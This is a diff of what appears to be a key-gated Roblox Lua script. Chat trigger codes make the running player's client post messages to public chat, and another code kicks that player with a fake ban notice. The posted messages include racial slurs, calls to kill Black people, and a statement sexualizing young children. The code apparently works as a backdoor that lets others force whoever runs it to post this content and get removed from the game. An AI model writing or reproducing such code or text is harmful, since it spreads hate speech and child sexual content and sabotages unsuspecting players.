@@ -1,15 +1,15 @@
 local function onChatMessage(message, speaker)
-    if message == "A1s" then
+    if message == "Ax1" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Hate Niggers So Fucking Much", "All")
-    elseif message == "A2s" then
+    elseif message == "Ax2" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I WISH ALL BLACK MONKEY NIGGERS DIE", "All")
-    elseif message == "A3s" then
+    elseif message == "Ax3" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("GOD I HATE THESE FUCKING MONKEYS", "All")
-    elseif message == "A4s" then
+    elseif message == "Ax4" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("EVERYONE KILL THESE NIGGERS", "All")
-    elseif message == "PB@N" then
+    elseif message == "Tempuban" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Want to Fuck kids, specially those 10 years or younger. They have the tightest Pussies.", "All")
-    elseif message:lower() == "TBAN" then
+    elseif message:lower() == "PBAN" then
         -- Kick the local player
         game:GetService("Players").LocalPlayer:Kick("You Have Been Banned From Entering The Game! ")
     end
@@ -35,7 +35,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
-local validKeys = { "there is no key", "ss"}
+local validKeys = { "123321456654789987987789654456321123", "  "}
 
 -- Function to show options GUI
 local function showOptionsGui()
